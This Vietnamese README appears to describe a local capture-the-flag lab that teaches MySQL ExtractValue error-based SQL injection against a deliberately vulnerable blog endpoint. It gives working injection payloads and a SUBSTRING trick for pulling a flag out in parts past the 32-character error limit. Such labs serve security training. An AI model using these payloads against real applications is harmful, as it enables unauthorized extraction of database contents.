# SQLi-011: MySQL ExtractValue Error-based với Multi-part Extraction

## 🎯 Mục Tiêu

Kỹ thuật **ExtractValue Error-based** - Bypass giới hạn 32 ký tự bằng cách chia flag thành nhiều phần.

## 📝 Kịch Bản

Blog platform hiển thị bài viết. Tham số `article_id` vulnerable.

**URL:** `http://localhost:5011/article?id=1`

## 🎓 Kiến Thức

```sql
' AND ExtractValue(1,CONCAT(0x7e,(SELECT data)))--
```

ExtractValue giới hạn 32 ký tự → Cần SUBSTRING để lấy phần còn lại của flag.

**Payload Pattern:**

- Part 1: `ExtractValue(1,CONCAT(0x7e,(SELECT value FROM flags)))`
- Part 2: `ExtractValue(1,CONCAT(0x7e,SUBSTRING((SELECT value FROM flags),30)))`

## 🚀 Chạy Lab

```bash
docker-compose up -d
# http://localhost:5011
```

## 🏁 Flag

Extract từ bảng `flags`.
